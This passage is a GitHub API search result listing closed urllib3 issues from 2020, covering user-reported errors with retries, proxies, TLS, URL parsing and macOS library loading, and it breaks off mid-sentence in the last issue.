{"total_count": 667, "incomplete_results": false, "items": [{"url": "https://api.github.com/repos/urllib3/urllib3/issues/1915", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1915/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1915/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1915/events", "html_url": "https://github.com/urllib3/urllib3/issues/1915", "id": 671057910, "node_id": "MDU6SXNzdWU2NzEwNTc5MTA=", "number": 1915, "title": "urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=38771): Max retries exceeded with url: /session/3143eb49468d87d5490d14852be56fe1/cookie (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f31faf32a30>: Failed to establish a new connection: [Errno 111] Connection refused'))", "user": {"login": "azamet90", "id": 44042178, "node_id": "MDQ6VXNlcjQ0MDQyMTc4", "avatar_url": "https://avatars1.githubusercontent.com/u/44042178?v=4", "gravatar_id": "", "url": "https://api.github.com/users/azamet90", "html_url": "https://github.com/azamet90", "followers_url": "https://api.github.com/users/azamet90/followers", "following_url": "https://api.github.com/users/azamet90/following{/other_user}", "gists_url": "https://api.github.com/users/azamet90/gists{/gist_id}", "starred_url": "https://api.github.com/users/azamet90/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/azamet90/subscriptions", "organizations_url": "https://api.github.com/users/azamet90/orgs", "repos_url": "https://api.github.com/users/azamet90/repos", "events_url": "https://api.github.com/users/azamet90/events{/privacy}", "received_events_url": "https://api.github.com/users/azamet90/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-08-01T17:44:42Z", "updated_at": "2020-08-01T23:45:05Z", "closed_at": "2020-08-01T23:45:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\n        try:\r\n            time.sleep(2)\r\n            browser.close()\r\n            browser.quit()\r\n            browser.delete_all_cookies()\r\n            os.system(\"pkill chromium\")\r\n            os.system(\"pkill chromedriver\")\r\n            time.sleep(1)\r\n            recaptchashit()\r\n            Discord()\r\n        except MaxRetryError:\r\n            browser.delete_all_cookies()\r\n            time.sleep(1)\r\n            main()\r\n```\r\nthis is a part of my code but i cannot understand how to close a window and open it again without getting urllib3.exceptions.MaxRetryError ?\r\n\r\nit only happens if i close and quit the browser and open it with new proxy ...", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1914", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1914/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1914/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1914/events", "html_url": "https://github.com/urllib3/urllib3/issues/1914", "id": 664889444, "node_id": "MDU6SXNzdWU2NjQ4ODk0NDQ=", "number": 1914, "title": "No change log for 1.25.10", "user": {"login": "therefromhere", "id": 197540, "node_id": "MDQ6VXNlcjE5NzU0MA==", "avatar_url": "https://avatars2.githubusercontent.com/u/197540?v=4", "gravatar_id": "", "url": "https://api.github.com/users/therefromhere", "html_url": "https://github.com/therefromhere", "followers_url": "https://api.github.com/users/therefromhere/followers", "following_url": "https://api.github.com/users/therefromhere/following{/other_user}", "gists_url": "https://api.github.com/users/therefromhere/gists{/gist_id}", "starred_url": "https://api.github.com/users/therefromhere/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/therefromhere/subscriptions", "organizations_url": "https://api.github.com/users/therefromhere/orgs", "repos_url": "https://api.github.com/users/therefromhere/repos", "events_url": "https://api.github.com/users/therefromhere/events{/privacy}", "received_events_url": "https://api.github.com/users/therefromhere/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-07-24T03:20:50Z", "updated_at": "2020-07-25T00:27:50Z", "closed_at": "2020-07-25T00:27:50Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, can you add a change log for v1.25.10 to CHANGES.rst?\r\n\r\nThanks", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1913", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1913/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1913/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1913/events", "html_url": "https://github.com/urllib3/urllib3/issues/1913", "id": 664828170, "node_id": "MDU6SXNzdWU2NjQ4MjgxNzA=", "number": 1913, "title": "Change request headers in between retries", "user": {"login": "alfred-soroush", "id": 61425037, "node_id": "MDQ6VXNlcjYxNDI1MDM3", "avatar_url": "https://avatars2.githubusercontent.com/u/61425037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/alfred-soroush", "html_url": "https://github.com/alfred-soroush", "followers_url": "https://api.github.com/users/alfred-soroush/followers", "following_url": "https://api.github.com/users/alfred-soroush/following{/other_user}", "gists_url": "https://api.github.com/users/alfred-soroush/gists{/gist_id}", "starred_url": "https://api.github.com/users/alfred-soroush/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/alfred-soroush/subscriptions", "organizations_url": "https://api.github.com/users/alfred-soroush/orgs", "repos_url": "https://api.github.com/users/alfred-soroush/repos", "events_url": "https://api.github.com/users/alfred-soroush/events{/privacy}", "received_events_url": "https://api.github.com/users/alfred-soroush/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2020-07-23T23:36:52Z", "updated_at": "2020-07-24T17:34:00Z", "closed_at": "2020-07-24T15:05:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Consider an http request using an OAuth token. The access token needs to be included in the header as bearer. However, if the token is expired, another request needs to be made to refresh the token and then try again. So the custom Retry object will look like:\r\n\r\n```\r\nclass OAuthRetry(Retry):\r\n    def increment(self, method, url, *args, **kwargs):\r\n        # refresh the token here\r\n        return super(OAuthRetry, self).increment(method, url, *args, **kwargs)\r\n```\r\n\r\nThe problem is that after the token is refreshed, HTTPConnectionPool is still using the same `headers` to make the request after calling `increment`. See: [https://github.com/urllib3/urllib3/blob/master/src/urllib3/connectionpool.py#L787](https://github.com/urllib3/urllib3/blob/master/src/urllib3/connectionpool.py#L787).\r\nAlthough the instance of the pool is passed in `increment`, changing the headers there will not affect the call since it is using a local copy of the headers.\r\n\r\nThis seems like a use case that should come up frequently for the request parameters to change in between retries.\r\n\r\nIs there a plan to support this?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1908", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1908/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1908/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1908/events", "html_url": "https://github.com/urllib3/urllib3/issues/1908", "id": 658920059, "node_id": "MDU6SXNzdWU2NTg5MjAwNTk=", "number": 1908, "title": "module 'urllib3.util' has no attribute 'PROTOCOL_TLS'", "user": {"login": "wangoloj", "id": 57083309, "node_id": "MDQ6VXNlcjU3MDgzMzA5", "avatar_url": "https://avatars0.githubusercontent.com/u/57083309?v=4", "gravatar_id": "", "url": "https://api.github.com/users/wangoloj", "html_url": "https://github.com/wangoloj", "followers_url": "https://api.github.com/users/wangoloj/followers", "following_url": "https://api.github.com/users/wangoloj/following{/other_user}", "gists_url": "https://api.github.com/users/wangoloj/gists{/gist_id}", "starred_url": "https://api.github.com/users/wangoloj/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/wangoloj/subscriptions", "organizations_url": "https://api.github.com/users/wangoloj/orgs", "repos_url": "https://api.github.com/users/wangoloj/repos", "events_url": "https://api.github.com/users/wangoloj/events{/privacy}", "received_events_url": "https://api.github.com/users/wangoloj/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-07-17T06:31:06Z", "updated_at": "2020-07-18T16:58:04Z", "closed_at": "2020-07-18T16:58:03Z", "author_association": "NONE", "active_lock_reason": null, "body": "This is the error i get i don't know why\r\n\r\n```\r\n# Map from urllib3 to PyOpenSSL compatible parameter-values.\r\n_openssl_versions = {\r\n    util.PROTOCOL_TLS: OpenSSL.SSL.SSLv23_METHOD,\r\n    ssl.PROTOCOL_TLSv1: OpenSSL.SSL.TLSv1_METHOD,\r\n}\r\n```\r\nThere are no much information I can provide again.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1904", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1904/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1904/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1904/events", "html_url": "https://github.com/urllib3/urllib3/issues/1904", "id": 658307565, "node_id": "MDU6SXNzdWU2NTgzMDc1NjU=", "number": 1904, "title": "macOS Big Sur dynamic linker cache causes contrib/securetransport to raise an ImportError", "user": {"login": "sheagcraig", "id": 3568072, "node_id": "MDQ6VXNlcjM1NjgwNzI=", "avatar_url": "https://avatars1.githubusercontent.com/u/3568072?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sheagcraig", "html_url": "https://github.com/sheagcraig", "followers_url": "https://api.github.com/users/sheagcraig/followers", "following_url": "https://api.github.com/users/sheagcraig/following{/other_user}", "gists_url": "https://api.github.com/users/sheagcraig/gists{/gist_id}", "starred_url": "https://api.github.com/users/sheagcraig/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sheagcraig/subscriptions", "organizations_url": "https://api.github.com/users/sheagcraig/orgs", "repos_url": "https://api.github.com/users/sheagcraig/repos", "events_url": "https://api.github.com/users/sheagcraig/events{/privacy}", "received_events_url": "https://api.github.com/users/sheagcraig/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-07-16T15:30:27Z", "updated_at": "2020-07-20T16:01:42Z", "closed_at": "2020-07-20T16:01:42Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "On macOS Big Sur, Apple has added a \"dynamic linker cache\". When ctypes tries to find the Security and CoreFoundation frameworks, an ImportError is raised, really because `ctypes.utils.find_library` can't see that the path exists. However, if you go ahead and load it anyway, everything is happy.\r\n\r\nPlease see: https://developer.apple.com/documentation/macos-release-notes/macos-big-sur-11-beta-release-notes\r\nSpecifically:\r\nNew in macOS Big Sur 11 beta, the system ships with a built-in dynamic linker cache of all system-provided libraries. As part of this change, copies of dynamic libraries are no longer present on the filesystem. Code that attempts to check for dynamic library presence by looking for a file at a path or enumerating a directory will fail. Instead, check for library presence by attempting to dlopen() the path, which will correctly check for the library in the cache. (62986286)\r\n\r\nI have a PR for this ~incoming~ #1905 .", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1901", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1901/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1901/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1901/events", "html_url": "https://github.com/urllib3/urllib3/issues/1901", "id": 655252002, "node_id": "MDU6SXNzdWU2NTUyNTIwMDI=", "number": 1901, "title": "Strange timeout on an IP request", "user": {"login": "muxishuihan", "id": 33027618, "node_id": "MDQ6VXNlcjMzMDI3NjE4", "avatar_url": "https://avatars0.githubusercontent.com/u/33027618?v=4", "gravatar_id": "", "url": "https://api.github.com/users/muxishuihan", "html_url": "https://github.com/muxishuihan", "followers_url": "https://api.github.com/users/muxishuihan/followers", "following_url": "https://api.github.com/users/muxishuihan/following{/other_user}", "gists_url": "https://api.github.com/users/muxishuihan/gists{/gist_id}", "starred_url": "https://api.github.com/users/muxishuihan/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/muxishuihan/subscriptions", "organizations_url": "https://api.github.com/users/muxishuihan/orgs", "repos_url": "https://api.github.com/users/muxishuihan/repos", "events_url": "https://api.github.com/users/muxishuihan/events{/privacy}", "received_events_url": "https://api.github.com/users/muxishuihan/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-07-11T17:57:08Z", "updated_at": "2020-07-12T05:48:02Z", "closed_at": "2020-07-12T05:48:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, i encountered a timeout while making a request to an IP, i have set the timeout parameter but the program is still stuck.My code is below:\r\n\r\n```\r\nimport urllib3\r\n\r\nurl='47.104.233.88:80'\r\nhttp = urllib3.PoolManager(timeout=urllib3.Timeout(connect=1.5, read=1.5))\r\nrq = http.urlopen('GET',url='http://' + url)\r\n```\r\n\r\nI'm not sure if this is a silly question, if it is, I'm sorry for disturbing.\r\nLook forward to your reply.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1899", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1899/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1899/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1899/events", "html_url": "https://github.com/urllib3/urllib3/issues/1899", "id": 650874347, "node_id": "MDU6SXNzdWU2NTA4NzQzNDc=", "number": 1899, "title": "ProxyManager with HTTP proxy, too many redirects", "user": {"login": "lemon-bean", "id": 62434637, "node_id": "MDQ6VXNlcjYyNDM0NjM3", "avatar_url": "https://avatars0.githubusercontent.com/u/62434637?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lemon-bean", "html_url": "https://github.com/lemon-bean", "followers_url": "https://api.github.com/users/lemon-bean/followers", "following_url": "https://api.github.com/users/lemon-bean/following{/other_user}", "gists_url": "https://api.github.com/users/lemon-bean/gists{/gist_id}", "starred_url": "https://api.github.com/users/lemon-bean/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lemon-bean/subscriptions", "organizations_url": "https://api.github.com/users/lemon-bean/orgs", "repos_url": "https://api.github.com/users/lemon-bean/repos", "events_url": "https://api.github.com/users/lemon-bean/events{/privacy}", "received_events_url": "https://api.github.com/users/lemon-bean/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-07-04T11:21:33Z", "updated_at": "2020-07-05T07:12:23Z", "closed_at": "2020-07-04T20:41:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "After following the instruction in [urllib3 document](https://urllib3.readthedocs.io/en/latest/advanced-usage.html), I tried this code\r\n\r\n```\r\nimport urllib3\r\n\r\nproxy = urllib3.ProxyManager('http://localhost:1187')\r\nproxy.request('GET', 'http://google.com/')\r\n```\r\n\r\nAnd I got this result:\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/proxy_testing.py\", line 70, in <module>\r\n    test_urllib()\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/proxy_testing.py\", line 13, in test_urllib\r\n    r1 = proxy.request('GET', 'http://google.com/')\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/request.py\", line 76, in request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 488, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 378, in urlopen\r\n    return self.urlopen(method, redirect_location, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 488, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 378, in urlopen\r\n    return self.urlopen(method, redirect_location, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 488, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 378, in urlopen\r\n    return self.urlopen(method, redirect_location, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 488, in urlopen\r\n    return super(ProxyManager, self).urlopen(method, url, redirect=redirect, **kw)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 365, in urlopen\r\n    retries = retries.increment(method, url, response=response, _pool=conn)\r\n  File \"/Users/Kable/Documents/2_AI/TF_projects/env/lib/python3.7/site-packages/urllib3/util/retry.py\", line 439, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\n**urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='localhost', port=1187)**: Max retries exceeded with url: http://www.google.com/ (Caused by ResponseError('too many redirects'))\r\n```\r\n\r\nWhat can I do to get it to work?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1895", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1895/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1895/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1895/events", "html_url": "https://github.com/urllib3/urllib3/issues/1895", "id": 645812419, "node_id": "MDU6SXNzdWU2NDU4MTI0MTk=", "number": 1895, "title": "userinfo embedded in url does not allow '\\' character", "user": {"login": "r1200gs", "id": 69491, "node_id": "MDQ6VXNlcjY5NDkx", "avatar_url": "https://avatars0.githubusercontent.com/u/69491?v=4", "gravatar_id": "", "url": "https://api.github.com/users/r1200gs", "html_url": "https://github.com/r1200gs", "followers_url": "https://api.github.com/users/r1200gs/followers", "following_url": "https://api.github.com/users/r1200gs/following{/other_user}", "gists_url": "https://api.github.com/users/r1200gs/gists{/gist_id}", "starred_url": "https://api.github.com/users/r1200gs/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/r1200gs/subscriptions", "organizations_url": "https://api.github.com/users/r1200gs/orgs", "repos_url": "https://api.github.com/users/r1200gs/repos", "events_url": "https://api.github.com/users/r1200gs/events{/privacy}", "received_events_url": "https://api.github.com/users/r1200gs/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-06-25T19:53:29Z", "updated_at": "2020-06-25T21:10:55Z", "closed_at": "2020-06-25T21:10:55Z", "author_association": "NONE", "active_lock_reason": null, "body": "userinfo in the form 'domain\\username:password' is not parsed correctly because of the '\\\\'.  the fix is:\r\n\r\nurllib3/util/url.py:\r\n\r\n```\r\n# this regex prevents user ids with domain prefixes from parsing correctly\r\n# fixed version below\r\n#  r\u201d(?://([^\\\\\\\\/?#]*))?\u201d\r\nURI_RE = re.compile(\r\n  r\u201d^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?\u201d\r\n  r\u201d(?://([^/?#]*))?\u201d\r\n  r\u201d([^?#]*)\u201d\r\n  r\u201d(?:\\?([^#]*))?\u201d\r\n  r\u201d(?:#(.*))?$\u201c,\r\n  re.UNICODE | re.DOTALL,\r\n)\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1892", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1892/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1892/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1892/events", "html_url": "https://github.com/urllib3/urllib3/issues/1892", "id": 641095948, "node_id": "MDU6SXNzdWU2NDEwOTU5NDg=", "number": 1892, "title": "urllib3 should send http/1.1 ALPN extension by default", "user": {"login": "tiran", "id": 444071, "node_id": "MDQ6VXNlcjQ0NDA3MQ==", "avatar_url": "https://avatars3.githubusercontent.com/u/444071?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tiran", "html_url": "https://github.com/tiran", "followers_url": "https://api.github.com/users/tiran/followers", "following_url": "https://api.github.com/users/tiran/following{/other_user}", "gists_url": "https://api.github.com/users/tiran/gists{/gist_id}", "starred_url": "https://api.github.com/users/tiran/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tiran/subscriptions", "organizations_url": "https://api.github.com/users/tiran/orgs", "repos_url": "https://api.github.com/users/tiran/repos", "events_url": "https://api.github.com/users/tiran/events{/privacy}", "received_events_url": "https://api.github.com/users/tiran/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}, {"id": 907324977, "node_id": "MDU6TGFiZWw5MDczMjQ5Nzc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/TLS", "name": "TLS", "color": "1116a3", "default": false, "description": ""}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-06-18T10:30:42Z", "updated_at": "2020-07-16T16:32:28Z", "closed_at": "2020-07-16T16:06:00Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Some servers start to require ALPN extension and shut down HTTPS connections forecefully when a client does not indicate HTTP protocol version in ALPN extension. The fix is a trivial one-liner. Daniel told me that curl has been setting ALPN header for years without any negative side-effects.\r\n\r\nSee https://bugs.python.org/issue40968 for CPython bug\r\nSee https://github.com/python/cpython/pull/20959 for CPython PR", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1890", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1890/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1890/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1890/events", "html_url": "https://github.com/urllib3/urllib3/issues/1890", "id": 638119517, "node_id": "MDU6SXNzdWU2MzgxMTk1MTc=", "number": 1890, "title": "InvalidURL Exception", "user": {"login": "yixi7994498", "id": 62233472, "node_id": "MDQ6VXNlcjYyMjMzNDcy", "avatar_url": "https://avatars1.githubusercontent.com/u/62233472?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yixi7994498", "html_url": "https://github.com/yixi7994498", "followers_url": "https://api.github.com/users/yixi7994498/followers", "following_url": "https://api.github.com/users/yixi7994498/following{/other_user}", "gists_url": "https://api.github.com/users/yixi7994498/gists{/gist_id}", "starred_url": "https://api.github.com/users/yixi7994498/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yixi7994498/subscriptions", "organizations_url": "https://api.github.com/users/yixi7994498/orgs", "repos_url": "https://api.github.com/users/yixi7994498/repos", "events_url": "https://api.github.com/users/yixi7994498/events{/privacy}", "received_events_url": "https://api.github.com/users/yixi7994498/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-13T08:09:25Z", "updated_at": "2020-06-13T14:24:48Z", "closed_at": "2020-06-13T14:24:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "Traceback (most recent call last):\r\n  File \"/usr/local/lib/python3.6/dist-packages/discord/client.py\", line 312, in _run_event\r\n    await coro(*args, **kwargs)\r\n  File \"main.py\", line 320, in on_message\r\n    response = urllib.request.urlopen(\"https://test.com/\" + address).read().decode('utf-8')\r\n  File \"/usr/lib/python3.6/urllib/request.py\", line 223, in urlopen\r\n    return opener.open(url, data, timeout)\r\n  File \"/usr/lib/python3.6/urllib/request.py\", line 526, in open\r\n    response = self._open(req, data)\r\n  File \"/usr/lib/python3.6/urllib/request.py\", line 544, in _open\r\n    '_open', req)\r\n  File \"/usr/lib/python3.6/urllib/request.py\", line 504, in _call_chain\r\n    result = func(*args)\r\n  File \"/usr/lib/python3.6/urllib/request.py\", line 1368, in https_open\r\n    context=self._context, check_hostname=self._check_hostname)\r\n  File \"/usr/lib/python3.6/urllib/request.py\", line 1325, in do_open\r\n    encode_chunked=req.has_header('Transfer-encoding'))\r\n  File \"/usr/lib/python3.6/http/client.py\", line 1264, in request\r\n    self._send_request(method, url, body, headers, encode_chunked)\r\n  File \"/usr/lib/python3.6/http/client.py\", line 1275, in _send_request\r\n    self.putrequest(method, url, **skips)\r\n  File \"/usr/lib/python3.6/http/client.py\", line 1129, in putrequest\r\n    raise InvalidURL(f\"URL can't contain control characters. {url!r} \"\r\nhttp.client.InvalidURL: URL can't contain control characters. \"/' '\" (found at least ' ')\r\n\r\n\r\nThere is exception for this?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1889", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1889/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1889/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1889/events", "html_url": "https://github.com/urllib3/urllib3/issues/1889", "id": 637002897, "node_id": "MDU6SXNzdWU2MzcwMDI4OTc=", "number": 1889, "title": "Find out why the SSLKEYLOGFILE fails on AppVeyor", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-06-11T13:14:17Z", "updated_at": "2020-06-24T19:38:18Z", "closed_at": "2020-06-24T19:38:18Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "See https://github.com/urllib3/urllib3/pull/1867 for details. @bastiaanb mentions that the feature works on Windows, but the test fails on AppVeyor, so we had to skip the test on Windows.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1884", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1884/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1884/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1884/events", "html_url": "https://github.com/urllib3/urllib3/issues/1884", "id": 628719181, "node_id": "MDU6SXNzdWU2Mjg3MTkxODE=", "number": 1884, "title": "Add additional documentation for HTTPSConnection parameters", "user": {"login": "sirosen", "id": 1300022, "node_id": "MDQ6VXNlcjEzMDAwMjI=", "avatar_url": "https://avatars3.githubusercontent.com/u/1300022?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sirosen", "html_url": "https://github.com/sirosen", "followers_url": "https://api.github.com/users/sirosen/followers", "following_url": "https://api.github.com/users/sirosen/following{/other_user}", "gists_url": "https://api.github.com/users/sirosen/gists{/gist_id}", "starred_url": "https://api.github.com/users/sirosen/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sirosen/subscriptions", "organizations_url": "https://api.github.com/users/sirosen/orgs", "repos_url": "https://api.github.com/users/sirosen/repos", "events_url": "https://api.github.com/users/sirosen/events{/privacy}", "received_events_url": "https://api.github.com/users/sirosen/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}, {"id": 404015969, "node_id": "MDU6TGFiZWw0MDQwMTU5Njk=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Documentation", "name": "Documentation", "color": "006b75", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-06-01T20:52:37Z", "updated_at": "2020-08-10T14:26:22Z", "closed_at": "2020-08-10T14:26:22Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I'm not sure if this is intentional or not, but the 